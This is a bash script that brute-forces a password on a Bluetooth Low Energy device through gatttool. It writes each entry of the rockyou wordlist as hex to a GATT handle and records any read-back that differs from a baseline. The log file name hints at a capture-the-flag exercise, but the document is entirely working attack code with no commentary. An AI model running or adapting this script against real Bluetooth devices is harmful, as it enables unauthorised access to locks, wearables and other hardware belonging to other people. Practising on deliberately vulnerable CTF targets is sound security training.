#!/bin/bash
MAC="D4:E9:F4:B1:57:62"
WORDLIST="rockyou.txt"
LOGFILE="flag5_brute.log"

exec 3<> /tmp/gatt_pipe
mkfifo /tmp/gatt_in 2>/dev/null
gatttool -b $MAC -I < /tmp/gatt_in > /tmp/gatt_out &
GATT_PID=$!
exec 4> /tmp/gatt_in

send_cmd() { echo "$1" >&4; sleep 0.4; }

send_cmd "connect"
sleep 2
send_cmd "char-write-req 0x0030 0005"
send_cmd "char-read-hnd 0x002c"
sleep 0.5
BASELINE=$(tail -5 /tmp/gatt_out | grep -oP '(?<=value: ).*')
echo "Baseline: $BASELINE" | tee -a $LOGFILE

COUNT=0
while IFS= read -r pw; do
    COUNT=$((COUNT+1))
    HEXVAL=$(echo -n "$pw" | xxd -ps | tr -d '\n')
    send_cmd "char-write-req 0x0030 0005"
    send_cmd "char-write-req 0x002a $HEXVAL"
    send_cmd "char-read-hnd 0x002c"
    sleep 0.3
    CURRENT=$(tail -5 /tmp/gatt_out | grep -oP '(?<=value: ).*')
    if [[ "$CURRENT" != "$BASELINE" ]]; then
        echo "=== HIT #$COUNT: '$pw' -> $CURRENT ===" | tee -a $LOGFILE
    fi
    (( COUNT % 200 == 0 )) && echo "[$COUNT] $pw" | tee -a $LOGFILE
done < "$WORDLIST"

kill $GATT_PID
